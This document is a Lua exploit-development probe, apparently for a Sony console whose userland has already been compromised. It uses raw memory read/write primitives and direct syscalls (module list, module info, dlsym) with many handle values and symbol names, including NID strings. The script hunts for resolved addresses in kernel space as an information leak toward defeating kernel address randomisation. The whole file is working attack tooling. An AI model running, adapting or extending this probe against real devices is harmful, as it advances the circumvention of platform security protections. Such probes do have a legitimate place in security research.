-- CRASH_CLASS: LOW
-- PROBE 1300b: dynlib_dlsym with correct handles from get_list2
--
-- Context: 1300a used handles 0/1/2/0x2001 but 659 returned 0/0x13/0x14.
-- dlsym(591) takes plain text names (NID requires supercall flag).
-- If any symbol resolves to kernel VA, that's a direct info leak.

print("=== PROBE 1300b: DLSYM REAL HANDLES ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end
local function fmt_qw(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function zero_buf(addr, size)
    for off = 0, size - 4, 4 do safe_wd(addr + off, 0) end
end
local function write_str(addr, s)
    zero_buf(addr, math.ceil((#s + 4) / 4) * 4)
    for i = 0, math.floor(#s / 4) do
        local val = 0
        for j = 0, 3 do
            local idx = i * 4 + j + 1
            if idx <= #s then
                val = val + string.byte(s, idx) * (2 ^ (j * 8))
            end
        end
        safe_wd(addr + i * 4, val)
    end
end

-- ============================================================
-- Step 1: Get real handle list from 659
-- ============================================================
print("[1] Getting module handles via 659")
local sc659 = make_syscall(659)
local hbuf = memory.alloc(0x200)
local cbuf = memory.alloc(8)
safe_wd(cbuf, 0)

local ok659, ret659 = pcall(function()
    return sc659(uint64(hbuf), uint64(50), uint64(cbuf))
end)
local cnt = safe_rd(cbuf) or 0
print(string.format("  659 ret=%d count=%d", ok659 and to_num(ret659) or -999, cnt))

local handles = {}
for i = 0, math.min(cnt - 1, 49) do
    local h = safe_rd(hbuf + i * 4) or 0
    table.insert(handles, h)
    print(string.format("  handle[%d] = 0x%X", i, h))
end

if #handles == 0 then
    handles = {0, 0x13, 0x14}
    print("  Fallback handles: 0, 0x13, 0x14")
end
print("")

-- ============================================================
-- Step 2: Get module names via 660 for each handle
-- ============================================================
print("[2] Module info via 660")
local sc660 = make_syscall(660)
local info = memory.alloc(0x200)

for _, h in ipairs(handles) do
    zero_buf(info, 0x200)
    safe_wd(info, 0x160)

    local ok, ret = pcall(function() return sc660(uint64(h), uint64(info)) end)
    local rv = ok and to_num(ret) or -999

    if rv == 0 then
        -- Name is at +0x08 (common Sony layout) or try reading string from buffer
        -- Dump first 0x40 bytes as hex for analysis
        local hex = {}
        for off = 0, 0x3C, 4 do
            table.insert(hex, string.format("%08X", safe_rd(info + off) or 0))
        end
        -- Also read segment info
        local seg0_base = safe_rq(info + 0x108)
        local seg0_size = safe_rq(info + 0x110)
        local seg1_base = safe_rq(info + 0x118)
        local seg1_size = safe_rq(info + 0x120)
        print(string.format("  h=0x%X ret=0", h))
        print(string.format("    header: %s %s %s %s", hex[1], hex[2], hex[3], hex[4]))
        print(string.format("    seg0: %s sz=%s", fmt_qw(seg0_base), fmt_qw(seg0_size)))
        print(string.format("    seg1: %s sz=%s", fmt_qw(seg1_base), fmt_qw(seg1_size)))

        -- Try to extract module name - scan for printable ASCII
        local name_chars = {}
        for off = 0x08, 0x40 do
            local dw_off = math.floor(off / 4) * 4
            local dw = safe_rd(info + dw_off) or 0
            local byte_idx = off % 4
            local byte = math.floor(dw / (2 ^ (byte_idx * 8))) % 256
            if byte >= 0x20 and byte <= 0x7E then
                table.insert(name_chars, string.char(byte))
            elseif byte == 0 and #name_chars > 0 then
                break
            end
        end
        if #name_chars > 0 then
            print(string.format("    name: %s", table.concat(name_chars)))
        end
    else
        print(string.format("  h=0x%X ret=%d", h, rv))
    end
end
print("")

-- ============================================================
-- Step 3: dlsym(591) with real handles and many symbol names
-- ============================================================
print("[3] dlsym(591) with real handles")

local sc591 = make_syscall(591)
local out_ptr = memory.alloc(16)
local name_buf = memory.alloc(256)

-- Comprehensive symbol list: libkernel, libc, SCE functions
local symbols = {
    -- Standard C/POSIX
    "malloc", "free", "calloc", "realloc",
    "memcpy", "memset", "memmove", "strcmp", "strlen",
    "printf", "puts", "exit", "abort",
    "open", "close", "read", "write",
    "mmap", "munmap", "mprotect",
    "socket", "connect", "bind", "listen", "accept",
    "getpid", "getuid", "getgid",
    "fork", "execve", "dup2",
    "pthread_create", "pthread_self",
    -- SCE kernel functions
    "sceKernelDlsym",
    "sceKernelGetModuleInfo",
    "sceKernelGetModuleInfoByName",
    "sceKernelGetModuleList",
    "sceKernelLoadStartModule",
    "sceKernelGetCompiledSdkVersion",
    "sceKernelSendNotificationRequest",
    "sceKernelDebugOutText",
    "sceKernelMmap",
    "sceKernelMunmap",
    "sceKernelMprotect",
    "sceKernelOpen",
    "sceKernelClose",
    "sceKernelRead",
    "sceKernelWrite",
    "sceKernelGetCurrentCpu",
    "sceKernelUsleep",
    "sceKernelGettimeofday",
    "sceKernelGetProcParam",
    "sceKernelGetFsSandboxRandomWord",
    "sceKernelJitCreateSharedMemory",
    "sceKernelJitCreateAliasOfSharedMemory",
    "sceKernelJitMapSharedMemory",
    "sceKernelGetCpuFrequency",
    "sceKernelGetCpuTemperature",
    "sceKernelGetSocSensorTemperature",
    "sceKernelIsNeoMode",
    "sceKernelGetHwFeatureInfoForDecid",
    -- Module-specific
    "module_start", "module_stop", "module_info",
    "_init", "_fini",
    -- NID-format strings (computed for key functions)
    "LwG8g3niqwA",
    "kUpgrXIrz7Q",
    "gQX+4GDQjpM",
    "HoLVWNanBBc",
    "PGhQHd-dzv8",
    "1G3lF1Gg1k8",
}

local resolved = {}
local kptrs = 0

for _, h in ipairs(handles) do
    local h_resolved = 0
    for _, sym in ipairs(symbols) do
        write_str(name_buf, sym)
        safe_wq(out_ptr, uint64(0xDEADBEEFCAFE))

        local ok, ret = pcall(function()
            return sc591(uint64(h), uint64(name_buf), uint64(out_ptr))
        end)
        local rv = ok and to_num(ret) or -999

        if rv == 0 then
            local addr = safe_rq(out_ptr)
            local is_k = is_kptr(addr)
            if is_k then kptrs = kptrs + 1 end
            h_resolved = h_resolved + 1
            print(string.format("  h=0x%X '%s' -> %s%s",
                h, sym, fmt_qw(addr), is_k and " *** KERNEL ***" or ""))
            table.insert(resolved, {h = h, sym = sym, addr = addr, kptr = is_k})
        elseif rv == -999 then
            print(string.format("  h=0x%X '%s' CRASH", h, sym))
            break
        end
    end
    print(string.format("  h=0x%X: %d/%d resolved", h, h_resolved, #symbols))
end

print("")

-- ============================================================
-- Step 4: Also try 593 handles (0-38) in case 591 uses them
-- ============================================================
print("[4] dlsym(591) with 593-style handles (0-5)")

local quick_syms = {"malloc", "getpid", "sceKernelDlsym", "sceKernelOpen", "1G3lF1Gg1k8"}

for h = 0, 5 do
    for _, sym in ipairs(quick_syms) do
        write_str(name_buf, sym)
        safe_wq(out_ptr, uint64(0xDEADBEEFCAFE))

        local ok, ret = pcall(function()
            return sc591(uint64(h), uint64(name_buf), uint64(out_ptr))
        end)
        local rv = ok and to_num(ret) or -999

        if rv == 0 then
            local addr = safe_rq(out_ptr)
            print(string.format("  h=%d '%s' -> %s%s",
                h, sym, fmt_qw(addr), is_kptr(addr) and " *** KERNEL ***" or ""))
        end
    end
end

-- Also try special handle values
for _, h in ipairs({0xFFFF, 0xFFFE, 0x10000, 0x20000}) do
    write_str(name_buf, "getpid")
    safe_wq(out_ptr, uint64(0xDEADBEEFCAFE))
    local ok, ret = pcall(function()
        return sc591(uint64(h), uint64(name_buf), uint64(out_ptr))
    end)
    local rv = ok and to_num(ret) or -999
    if rv == 0 then
        local addr = safe_rq(out_ptr)
        print(string.format("  h=0x%X 'getpid' -> %s", h, fmt_qw(addr)))
    end
end

print("")

-- ============================================================
-- Summary
-- ============================================================
print("=== SUMMARY ===")
print(string.format("Total resolved: %d", #resolved))
print(string.format("Kernel pointers: %d", kptrs))

if #resolved > 0 then
    print("Resolved addresses:")
    for _, r in ipairs(resolved) do
        print(string.format("  h=0x%X %s = %s%s",
            r.h, r.sym, fmt_qw(r.addr), r.kptr and " KERNEL!" or ""))
    end

    -- Check if any resolved address is in an unexpected range
    for _, r in ipairs(resolved) do
        local h, l = get_hi_lo(r.addr)
        if h > 0x0F and h < 0xFFFF8000 then
            print(string.format("  UNUSUAL RANGE: h=0x%X %s = %s", r.h, r.sym, fmt_qw(r.addr)))
        end
    end
end

print("=== DONE ===")
